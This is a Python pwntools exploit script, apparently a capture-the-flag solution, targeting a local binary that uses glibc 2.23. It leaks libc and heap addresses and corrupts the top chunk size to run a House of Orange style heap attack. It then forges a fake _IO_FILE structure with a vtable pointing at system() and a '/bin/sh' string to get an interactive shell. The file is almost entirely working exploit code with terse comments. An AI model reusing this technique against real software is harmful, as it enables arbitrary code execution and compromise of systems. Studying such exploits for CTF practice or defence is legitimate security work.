from pwn import*
def new(size):
	p.sendlineafter('>>','1')
	p.sendlineafter('size:',str(size))
def edit(content):
	p.sendlineafter('>>','3')
	p.sendafter('content:',content)
def free():
	p.sendlineafter('>>','4')
p = process('./main')
libc=  ELF('./libc-2.23.so',checksec=False)
new(0x200000)
libc_base = int(p.recvuntil("\n")[:-1],16)- 0x10 + 0x201000
IO_list_all=libc_base+libc.sym["_IO_list_all"]
unsorted_bins=libc_base+libc.sym['__malloc_hook']+0x58 + 0x10
system=libc_base+libc.sym['system']
free()
new(0x2F0)
heap_base = int(p.recvuntil("\n")[:-1],16)-0x10
edit('\x00'*0x2F0+p64(0) + p64(0xD01) + '\n')
free()
new(0x1000)		#the top_chunk will be put into unsorted_bins 
free()
new(0x2F0)
edit('\x00'*0x2F8 + p64(0xCE1) + p64(unsorted_bins)*2 + '\x00'*0xCC0 + p64(0xCE0) + p64(0x11) + '\n') #split the chunk that the size is 0x300 from unsorted chunk,and the rest also has been modified.
free()
new(0x3F0) #the chunk that the size is 0x300 will be put into small bins,then get chunk from the rest unsorted chunk
free()
new(0x2F0) #get the chunk from small bins
data = '\x00'*0x2F0 + p64(0) + p64(0x401) + p64(heap_base + 0x300 + 0x400) + p64(unsorted_bins) + '\x00'*(0x3F0-0x10)
fake_IO_FILE  = '/bin/sh\x00' + p64(0x61) + p64(unsorted_bins) + p64(IO_list_all -0x10)#make the IO_list_all ->fd =main_arena+88
fake_IO_FILE += p64(0) + p64(1)#satisfy write_base < write_ptr
fake_IO_FILE = fake_IO_FILE.ljust(0xC0,'\x00')
fake_IO_FILE += p64(0xFFFFFFFFFFFFFFFF) + p64(0)*2
vtable = heap_base + 0x300 + 0x400 + len(fake_IO_FILE) + 8
fake_IO_FILE += p64(vtable)
fake_IO_FILE += p64(0) + p64(0)
fake_IO_FILE += p64(1) + p64(system)
data += fake_IO_FILE
edit(data + '\n')
free()
new(0x500)
p.interactive()
